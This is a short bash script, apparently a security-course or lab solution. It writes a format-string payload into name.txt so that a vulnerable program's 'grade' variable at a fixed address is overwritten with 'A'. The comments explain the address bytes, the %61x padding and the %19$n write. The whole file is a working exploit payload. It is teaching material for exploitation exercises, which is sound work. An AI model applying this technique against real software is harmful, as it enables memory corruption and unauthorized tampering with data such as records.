#!/bin/bash
# address of grade is 0x0804a01c
# \x1c\xa0\x04\x08%61x%19$n
# address is 4 bytes, need 65 bytes in total to write "A"
# %61x adds 61 bytes to 4 bytes, total 65 bytes
# %19 is the place where the buffer starts
# meaning where to write the address of grade
# $n counts the total bytes (65 in this case) and writes to the address of grade
python -c 'print "\x1c\xa0\x04\x08%61x%19$n";' > name.txt
python -c 'print "Wright Kim";' >> name.txt
	

